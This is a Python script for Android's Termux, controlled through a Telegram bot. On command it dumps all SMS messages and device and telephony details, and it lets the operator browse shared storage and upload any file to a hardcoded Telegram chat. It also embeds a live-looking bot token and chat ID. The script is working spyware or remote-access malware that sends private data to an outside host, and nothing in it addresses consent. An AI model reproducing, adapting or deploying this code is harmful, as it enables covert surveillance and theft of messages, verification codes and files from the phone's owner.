import os
import requests
import json
import subprocess
import re

# Replace with your bot token and chat ID
TOKEN = '7040988900:AAGKkd-rSdKh0T0gMgm2VC5oEMRdtxdCAXw'
CHAT_ID = '7117297879'

# Global variable to store current folder path
current_folder = "/storage/emulated/0/"

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(" ")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Escape special characters for Markdown formatting in Telegram
def escape_markdown(text):
    return re.sub(r'([*_`\[\]])', r'\\\1', text)

# Function to get SMS details
def get_sms():
    try:
        result = subprocess.run(['termux-sms-list'], stdout=subprocess.PIPE)
        sms_list = json.loads(result.stdout.decode('utf-8'))
        if sms_list:
            messages = []
            for sms in sms_list:
                sender = sms.get('sender', 'Unknown')
                message = sms.get('body', '')
                messages.append(f"From: {sender}\nMessage: {message}\n")
            return "\n".join(messages)
        else:
            return "No SMS messages found."
    except Exception as e:
        return f"Error retrieving SMS: {str(e)}"

# Function to get Wi-Fi connection information
def get_wifi_info():
    try:
        wifi_info = subprocess.check_output(['termux-wifi-connectioninfo']).decode().strip()
        wifi_data = json.loads(wifi_info)
        ssid = wifi_data.get("ssid", "Not connected")
        return f"Wi-Fi SSID: {ssid}"
    except Exception as e:
        return "Unable to retrieve Wi-Fi information."

# Function to get device information
def get_device_info():
    try:
        device_info = {}
        
        # Get device model and name
        device_info['Model'] = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        device_info['Device Name'] = subprocess.check_output(['getprop', 'ro.product.device']).decode().strip()

        # Get Android version
        device_info['Android Version'] = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()

        # Get IMEI (requires root access)
        try:
            device_info['IMEI'] = subprocess.check_output(['termux-telephony-deviceinfo']).decode().strip()
        except Exception:
            device_info['IMEI'] = "IMEI access denied or requires root."

        # Get battery status
        battery_status = subprocess.check_output(['termux-battery-status']).decode().strip()
        device_info['Battery'] = battery_status

        # Get Wi-Fi information
        device_info['Wi-Fi'] = get_wifi_info()

        # Format the device info for Telegram
        info_message = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
        escaped_message = escape_markdown(info_message)  # Escape Markdown special characters
        return escaped_message
    except Exception as e:
        return f"Error retrieving device info: {str(e)}"

# Function to handle folder navigation
def handle_folder_navigation(folder_name):
    global current_folder
    try:
        # Update the current folder path
        new_folder_path = os.path.join(current_folder, folder_name)
        
        if os.path.isdir(new_folder_path):
            current_folder = new_folder_path
            file_list = os.listdir(current_folder)
            if file_list:
                file_list_message = f"*Contents of `{current_folder}`:*\n"
                file_list_message += "\n".join([f"`{file}`" for file in file_list])
                file_list_message += "\n\nSend the file name to download it, or folder name to navigate."
                send_to_telegram(file_list_message)
            else:
                send_to_telegram("No files or folders found.")
        else:
            send_to_telegram(f"`{folder_name}` is not a valid folder.")
    except Exception as e:
        send_to_telegram(f"Error navigating folder: {str(e)}")

# Telegram bot logic to handle file, folder, SMS, and device requests
def handle_telegram_update(update):
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            if message == "/help":
                help_message = (
                    "*Available Commands:*\n"
                    "`/help` - Show this help message\n"
                    "`/sms` - Retrieve SMS messages\n"
                    "`/device` - Get device information\n"
                    "`/sdcard` - Browse SD card files\n"
                    "You can also send a folder name to navigate or a file name to download."
                )
                send_to_telegram(help_message)

            elif message == "/sms":
                sms_messages = get_sms()
                send_to_telegram(sms_messages)
            
            elif message == "/device":
                device_info = get_device_info()
                send_to_telegram(device_info)

            elif message == "/sdcard":
                global current_folder
                current_folder = "/storage/emulated/0/"
                send_to_telegram(f"Navigating to SD card: `{current_folder}`")
                handle_folder_navigation("")  # Show initial folder contents

            else:
                folder_path = os.path.join(current_folder, message)
                if os.path.isdir(folder_path):
                    handle_folder_navigation(message)
                else:
                    response_message = download_file(message)
                    send_to_telegram(response_message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Function to download a specific file
def download_file(file_name):
    try:
        file_path = os.path.join(current_folder, file_name)
        
        if os.path.isfile(file_path):
            # Send the file to Telegram
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': open(file_path, 'rb')}
            data = {"chat_id": CHAT_ID}
            response = requests.post(url, files=files, data=data)
            
            if response.status_code == 200:
                return f"File `{file_name}` sent successfully!"
            else:
                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
        else:
            return f"File `{file_name}` does not exist or is not a valid file."
    except Exception as e:
        return f"Error downloading file: {str(e)}"

# Example of how to handle incoming Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    # Step 1: Start in the base folder and show the list of files/folders
    send_to_telegram(f"Current folder: `{current_folder}`")
    handle_folder_navigation("")  # Show initial folder contents
    
    # Step 2: Listen for user input (folder, file, SMS, or device info)
    listen_for_updates()
              
